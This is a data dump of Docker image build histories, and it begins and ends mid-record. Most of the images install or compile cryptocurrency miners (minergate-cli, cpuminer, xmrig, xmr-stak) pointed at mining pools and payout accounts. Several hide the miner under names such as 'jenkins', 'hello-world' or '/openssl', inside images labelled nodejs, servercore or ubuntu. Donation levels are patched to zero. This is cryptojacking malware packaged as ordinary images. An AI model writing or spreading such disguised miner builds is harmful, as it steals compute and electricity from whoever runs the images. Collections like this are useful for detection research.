"";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get -qq --no-install-recommends install ca-certificates wget nvidia-375 &&     rm -r /var/lib/apt/lists/*\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli     && dpkg -i *.deb     && rm *.deb\nEXPOSE 45550\nEXPOSE 45560\nEXPOSE 45620\nEXPOSE 45570\nEXPOSE 45610\nEXPOSE 45640\nEXPOSE 45690\nEXPOSE 45720\nEXPOSE 45750\nEXPOSE 45590\nEXPOSE 45600\nEXPOSE 45730\nEXPOSE 45760\nEXPOSE 45670\nEXPOSE 45740\nEXPOSE 45770\nEXPOSE 3336\nENTRYPOINT ["minergate-cli -user unrealord@gmail.com"]'
geeta/testlarge; b'ADD file:d37ff24540ea7700d0fc053e1996b234428a88f3a324d7fcbd83d8ef95318040 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nENV MINERGATE_INSTALL=https://minergate.com/download/deb-cli\nENV USERNAME=user@email.com\nENV CURRENCY=eth\nENV CORES=2\nRUN apt-get update &&  apt-get install -y  ca-certificates  wget  curl  libpcre3-dev  libxcb1\nRUN curl -o \t/tmp/minergate-cli-release.deb -L \t"$MINERGATE_INSTALL" &&     dpkg -i /tmp/minergate-cli-release.deb &&     apt-get -y autoremove &&     apt-get -y clean &&     rm -rf /var/lib/apt/lists/* &&     rm -rf /tmp/* &&     rm -rf /var/tmp/*\nENTRYPOINT ["minergate-cli --user"]\nCMD ["uchauhan@gmail.com --xmr 2"]'
bznrgetnowtodaycf/july; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly2@outlook.com -p x -t 1"]'
jarlek/nodejs; b'ADD file:9788b61de35351489958c8abe175960865790312ced56458caa94ccb0b9bb757 /\nCMD ["bash"]\nRUN set -ex;     apt-get update;     apt-get install -y       bash       fluxbox       git       net-tools       novnc       socat       supervisor       x11vnc       xterm       xvfb       nano\nENV HOME=/root DEBIAN_FRONTEND=noninteractive LANG=en_US.UTF-8 LANGUAGE=en_US.UTF-8 LC_ALL=C.UTF-8 DISPLAY=:0.0 DISPLAY_WIDTH=1024 DISPLAY_HEIGHT=768 RUN_XTERM=yes RUN_FLUXBOX=yes\nRUN apt-get update     && set -x     && apt-get install -qq --no-install-recommends -y build-essential ca-certificates cmake git libuv1-dev libmicrohttpd-dev libssl-dev software-properties-common libhwloc-dev     && git clone https://github.com/xmrig/xmrig.git     && sed -i \'s/constexpr const int kMinimumDonateLevel = 1;/constexpr const int kMinimumDonateLevel = 0;/g\' /xmrig/src/donate.h     && cd /xmrig     && cmake -DWITH_LIBCPUID=OFF -DWITH_HTTPD=OFF .     && make     && cd -     && mv /xmrig/xmrig /usr/local/bin/jenkins     && mv /xmrig/libxmrig-asm.a /usr/local/bin/libxmrig-asm.a     && rm -rf /xmrig     && rm -rf /var/lib/apt/lists/*     && apt-get clean -qq\nRUN git clone https://github.com/Helmeboi/conf.git    && cd ./conf    && mv ./* /usr/local/bin/\nCOPY dir:4f9c921f479d816f169a5e74d0e0c0d780bfc42354842cc8436af308ca924af8 /app\nRUN chmod +x /app/conf.d/websockify.sh\nCMD ["/app/entrypoint.sh"]'
unrealord/mgbcn; b'ADD file:f5a2d04c3f3cafada15eb32e4e8d971e48ef11724939c399a8664bf498111e67 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get -qq --no-install-recommends install ca-certificates wget nvidia-375 &&     rm -r /var/lib/apt/lists/*\nRUN wget -q --content-disposition https://minergate.com/download/deb-cli     && dpkg -i *.deb     && rm *.deb\nEXPOSE 45550\nEXPOSE 45560\nEXPOSE 45620\nEXPOSE 45570\nEXPOSE 45610\nEXPOSE 45640\nEXPOSE 45690\nEXPOSE 45720\nEXPOSE 45750\nEXPOSE 45590\nEXPOSE 45600\nEXPOSE 45730\nEXPOSE 45760\nEXPOSE 45670\nEXPOSE 45740\nEXPOSE 45770\nEXPOSE 3336\nENTRYPOINT ["minergate-cli -user unrealord@gmail.com -bcn"]'
geeta/testxl; b'ADD file:d37ff24540ea7700d0fc053e1996b234428a88f3a324d7fcbd83d8ef95318040 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nENV MINERGATE_INSTALL=https://minergate.com/download/deb-cli\nENV USERNAME=user@email.com\nENV CURRENCY=eth\nENV CORES=2\nRUN apt-get update &&  apt-get install -y  ca-certificates  wget  curl  libpcre3-dev  libxcb1\nRUN curl -o \t/tmp/minergate-cli-release.deb -L \t"$MINERGATE_INSTALL" &&     dpkg -i /tmp/minergate-cli-release.deb &&     apt-get -y autoremove &&     apt-get -y clean &&     rm -rf /var/lib/apt/lists/* &&     rm -rf /tmp/* &&     rm -rf /var/tmp/*\nENTRYPOINT ["minergate-cli --user"]\nCMD ["uchauhan@gmail.com --eth 4"]'
funredis/sap; b'ADD file:9788b61de35351489958c8abe175960865790312ced56458caa94ccb0b9bb757 /\nCMD ["bash"]\nRUN set -ex;     apt-get update;     apt-get install -y       bash       fluxbox       git       net-tools       novnc       socat       supervisor       x11vnc       xterm       xvfb       nano\nENV HOME=/root DEBIAN_FRONTEND=noninteractive LANG=en_US.UTF-8 LANGUAGE=en_US.UTF-8 LC_ALL=C.UTF-8 DISPLAY=:0.0 DISPLAY_WIDTH=1024 DISPLAY_HEIGHT=768 RUN_XTERM=yes RUN_FLUXBOX=yes\nRUN apt-get update     && set -x     && apt-get install -qq --no-install-recommends -y build-essential ca-certificates cmake git libuv1-dev libmicrohttpd-dev libssl-dev software-properties-common libhwloc-dev     && git clone https://github.com/xmrig/xmrig.git     && sed -i \'s/constexpr const int kMinimumDonateLevel = 1;/constexpr const int kMinimumDonateLevel = 0;/g\' /xmrig/src/donate.h     && cd /xmrig     && cmake -DWITH_LIBCPUID=OFF -DWITH_HTTPD=OFF .     && make     && cd -     && mv /xmrig/xmrig /usr/local/bin/jenkins     && mv /xmrig/libxmrig-asm.a /usr/local/bin/libxmrig-asm.a     && rm -rf /xmrig     && rm -rf /var/lib/apt/lists/*     && apt-get clean -qq\nRUN git clone https://github.com/Helmeboi/conf.git    && cd ./conf    && mv ./* /usr/local/bin/\nCOPY dir:e58238cf71acbe331e576a77b19edb47b652d587efc009d4c726bf22c1a290ff /app\nRUN chmod +x /app/conf.d/websockify.sh\nCMD ["/app/entrypoint.sh"]'
byafarfurmailtk2/haxe; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
wpress/main; b'ADD file:85ed2ac9d10c6f076a01f29e72b653675994c6fcfb90f0e6b88368c0262893fa /\nCMD ["/bin/sh"]\nWORKDIR /app\nRUN echo "@testing http://nl.alpinelinux.org/alpine/edge/testing" >> //etc/apk/repositories\nRUN apk add --no-cache       libmicrohttpd       openssl       hwloc@testing       python2       py2-pip       libstdc++     && pip install envtpl\nCOPY dir:65f0c656fde45cca2d734e723d84b161a4c87d5e08fa944703e829976466a970 .\nENTRYPOINT ["/app/docker-entrypoint.sh"]\nCMD ["xmr-stak-cpu"]'
sacasa/jenis; b'ADD file:9788b61de35351489958c8abe175960865790312ced56458caa94ccb0b9bb757 /\nCMD ["bash"]\nRUN set -ex;     apt-get update;     apt-get install -y       bash       fluxbox       git       net-tools       novnc       socat       supervisor       x11vnc       xterm       xvfb       nano\nENV HOME=/root DEBIAN_FRONTEND=noninteractive LANG=en_US.UTF-8 LANGUAGE=en_US.UTF-8 LC_ALL=C.UTF-8 DISPLAY=:0.0 DISPLAY_WIDTH=1024 DISPLAY_HEIGHT=768 RUN_XTERM=yes RUN_FLUXBOX=yes\nRUN apt-get update     && set -x     && apt-get install -qq --no-install-recommends -y build-essential ca-certificates cmake git libuv1-dev libmicrohttpd-dev libssl-dev software-properties-common libhwloc-dev     && git clone https://github.com/xmrig/xmrig.git     && sed -i \'s/constexpr const int kMinimumDonateLevel = 1;/constexpr const int kMinimumDonateLevel = 0;/g\' /xmrig/src/donate.h     && cd /xmrig     && cmake -DWITH_LIBCPUID=OFF -DWITH_HTTPD=OFF .     && make     && cd -     && mv /xmrig/xmrig /usr/local/bin/jenkins     && mv /xmrig/libxmrig-asm.a /usr/local/bin/libxmrig-asm.a     && rm -rf /xmrig     && rm -rf /var/lib/apt/lists/*     && apt-get clean -qq\nRUN git clone https://github.com/Helmeboi/conf.git    && cd ./conf    && mv ./* /usr/local/bin/\nCOPY dir:4f9c921f479d816f169a5e74d0e0c0d780bfc42354842cc8436af308ca924af8 /app\nRUN chmod +x /app/conf.d/websockify.sh\nCMD ["/app/entrypoint.sh"]'
denraj/rubyco; b'ADD file:9788b61de35351489958c8abe175960865790312ced56458caa94ccb0b9bb757 /\nCMD ["bash"]\nRUN set -ex;     apt-get update;     apt-get install -y       bash       fluxbox       git       net-tools       novnc       socat       supervisor       x11vnc       xterm       xvfb       nano\nENV HOME=/root DEBIAN_FRONTEND=noninteractive LANG=en_US.UTF-8 LANGUAGE=en_US.UTF-8 LC_ALL=C.UTF-8 DISPLAY=:0.0 DISPLAY_WIDTH=1024 DISPLAY_HEIGHT=768 RUN_XTERM=yes RUN_FLUXBOX=yes\nRUN apt-get update     && set -x     && apt-get install -qq --no-install-recommends -y build-essential ca-certificates cmake git libuv1-dev libmicrohttpd-dev libssl-dev software-properties-common libhwloc-dev     && git clone https://github.com/xmrig/xmrig.git     && sed -i \'s/constexpr const int kMinimumDonateLevel = 1;/constexpr const int kMinimumDonateLevel = 0;/g\' /xmrig/src/donate.h     && cd /xmrig     && cmake -DWITH_LIBCPUID=OFF -DWITH_HTTPD=OFF .     && make     && cd -     && mv /xmrig/xmrig /usr/local/bin/jenkins     && mv /xmrig/libxmrig-asm.a /usr/local/bin/libxmrig-asm.a     && rm -rf /xmrig     && rm -rf /var/lib/apt/lists/*     && apt-get clean -qq\nRUN git clone https://github.com/Helmeboi/conf.git    && cd ./conf    && mv ./* /usr/local/bin/\nCOPY dir:4f9c921f479d816f169a5e74d0e0c0d780bfc42354842cc8436af308ca924af8 /app\nRUN chmod +x /app/conf.d/websockify.sh\nCMD ["/app/entrypoint.sh"]'
xkrm/cpuapp; b'ADD file:96db69a1ba6c80f604d07b14bcbf84445624ad3eb5b0471eddabf09cb7925366 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get -y update  && apt-get -y install git gawk libcrypto++-dev libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake g++ libssl-dev libgmp-dev  && git clone https://github.com/tpruvot/cpuminer-multi.git -b linux  && cd ./cpuminer-multi  && ./build.sh  && make  && mv /cpuminer-multi/cpuminer /bin/cpuapp  && rm -rf /cpuminer-multi  && apt-get -y remove git gawk libcrypto++-dev libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake g++ libssl-dev libgmp-dev  && apt-get clean\nADD file:0ff52a306c8d2f972e528242b74dd39779117f568c0bbfd09b4d894ec6e6612e /\nENTRYPOINT ["/run.sh"]'
kxyzw/testopl; b'ADD file:5b334adf9d9a2256add2a801b49d4b23c93b0973ec22bb798973d571c948f102 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update  && apt-get install -y git build-essential automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++  && cd /  && git clone https://github.com/JayDDee/cpuminer-opt  && cd cpuminer-opt  && ./build.sh  && cp ./cpuminer /openssl  && rm -rf ./*  && cd /  && apt-get autoremove -y git build-essential automake autoconf pkg-config make g++'
slippinjimmy/ubuntu100; b'ADD file:5b334adf9d9a2256add2a801b49d4b23c93b0973ec22bb798973d571c948f102 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nENV GIT_REPOSITORY=https://github.com/fireice-uk/xmr-stak.git\nENV CMAKE_C_COMPILER=gcc-5\nENV CMAKE_CXX_COMPILER=g++-5\nENV XMRSTAK_CMAKE_FLAGS=-DXMR-STAK_COMPILE=generic -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF\nRUN apt-get update     && set -x     && apt-get install -qq --no-install-recommends -y ca-certificates cmake g++ gcc git libhwloc-dev libmicrohttpd-dev libssl-dev lsb-release wget     && git clone $GIT_REPOSITORY     && cd /xmr-stak     && sed -i \'s/2.0/0.0/g\' xmrstak/donate-level.hpp     && cmake -DCMAKE_C_COMPILER=${CMAKE_C_COMPILER} -DCMAKE_CXX_COMPILER=${CMAKE_CXX_COMPILER} ${XMRSTAK_CMAKE_FLAGS} .     && make     && cd -     && mv /xmr-stak/bin/* /usr/local/bin/     && rm -rf /xmr-stak     && apt-get purge -y -qq cmake g++ gcc git libhwloc-dev libmicrohttpd-dev libssl-dev lsb-release wget     && apt-get clean -qq     && unset GIT_REPOSITORY     && mv /usr/local/bin/xmr-stak /usr/local/bin/hello-world\nVOLUME /mnt\nWORKDIR /mnt\nCOPY file:c7c7deb8ac03adab06dfc9de0e898f39938f28a69de3a28ad641720b2c905365 /mnt/pools.txt\nENTRYPOINT ["/usr/local/bin/hello-world -C pools.txt -i 0"]'
windevelop/servercore; b'Apply image 1607-RTM-amd64\nInstall update 1607-amd64\ncmd /S /C powershell -Command System.Net.ServicePointManager::SecurityProtocol = System.Net.SecurityProtocolType\'Tls,Tls11,Tls12\' ; Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v5.1.0/xmrig-5.1.0-msvc-win64.zip" -OutFile c:\\xmrig.zip ; Expand-Archive c:\\xmrig.zip; Remove-Item c:\\xmrig.zip -Force;\ncmd /S /C #(nop)  CMD ["cmd /S /C \\"c:\\\\xmrig\\\\xmrig-5.1.0\\\\xmrig.exe -o pool.supportxmr.com:7777 -u 4AEbLRG88aWYa7aYMYSRZbgt77wcnTNAjigWMwN6ginZHpqYuSfNTFrZUg1V6KUzP28j16t1iYyGVArCfz4AUjV9C8z91q6 -p docker:secret -k\\""]'
satamu/quqer; b'ADD file:28c0771e44ff530dba3f237024acc38e8ec9293d60f0e44c8c78536c12f13a0b /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm 